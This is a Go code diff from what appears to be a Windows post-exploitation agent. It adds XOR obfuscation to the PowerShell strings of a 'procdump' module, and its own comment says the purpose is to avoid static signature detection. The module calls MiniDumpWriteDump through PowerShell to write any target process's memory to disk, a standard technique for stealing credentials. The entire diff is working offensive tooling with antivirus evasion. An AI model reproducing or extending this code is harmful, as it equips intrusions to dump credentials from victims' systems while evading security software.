@@ -13,6 +13,21 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+// ProcDump PowerShell template parts, XOR-obfuscated to prevent static signature detection.
+// Must match xorKey (0x5A) used in shell.go and extra.go.
+var (
+	psMDImportDecl = []byte{0x01, 0x1e, 0x36, 0x36, 0x13, 0x37, 0x2a, 0x35, 0x28, 0x2e, 0x72, 0x78, 0x3e, 0x38, 0x3d, 0x32, 0x3f, 0x36, 0x2a, 0x74, 0x3e, 0x36, 0x36, 0x78, 0x73, 0x07, 0x2a, 0x2f, 0x38, 0x36, 0x33, 0x39, 0x7a, 0x29, 0x2e, 0x3b, 0x2e, 0x33, 0x39, 0x7a, 0x3f, 0x22, 0x2e, 0x3f, 0x28, 0x34, 0x7a, 0x38, 0x35, 0x35, 0x36, 0x7a, 0x17, 0x33, 0x34, 0x33, 0x1e, 0x2f, 0x37, 0x2a, 0x0d, 0x28, 0x33, 0x2e, 0x3f, 0x1e, 0x2f, 0x37, 0x2a, 0x72}
+	psMDCall       = []byte{0x01, 0x17, 0x1e, 0x07, 0x60, 0x60, 0x17, 0x33, 0x34, 0x33, 0x1e, 0x2f, 0x37, 0x2a, 0x0d, 0x28, 0x33, 0x2e, 0x3f, 0x1e, 0x2f, 0x37, 0x2a, 0x72}
+)
+
+func xorDecodeMD(b []byte) string {
+	out := make([]byte, len(b))
+	for i := range b {
+		out[i] = b[i] ^ 0x5A
+	}
+	return string(out)
+}
+
 // psWindows enumerates processes using CreateToolhelp32Snapshot.
 func PsModule(args string) (string, string, int) {
 	return psWindows()
@@ -208,14 +223,16 @@ func ProcDumpModuleActual(args string) (string, string, int) {
 		return "", "usage: procdump <pid> <output_path>", 1
 	}
 	pid, outPath := parts[0], parts[1]
+	mdDecl := xorDecodeMD(psMDImportDecl)
+	mdCall := xorDecodeMD(psMDCall)
 	psCmd := fmt.Sprintf(
 		"$p=Get-Process -Id %s; $d='%s'; "+
 			"Add-Type -TypeDefinition 'using System;using System.Diagnostics;"+
 			"using System.Runtime.InteropServices;public static class MD{"+
-			"[DllImport(\"dbghelp.dll\")]public static extern bool MiniDumpWriteDump("+
+			mdDecl+
 			"IntPtr h,int pid,IntPtr f,int t,IntPtr e,IntPtr u,IntPtr c);}' ; "+
 			"$s=[System.IO.File]::Create($d);"+
-			"[MD]::MiniDumpWriteDump($p.Handle,$p.Id,$s.SafeFileHandle.DangerousGetHandle(),"+
+			mdCall+"$p.Handle,$p.Id,$s.SafeFileHandle.DangerousGetHandle(),"+
 			"2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero); $s.Close()",
 		pid, outPath)
 	return ShellModule("powershell -NoProfile -Command \"" + psCmd + "\"")
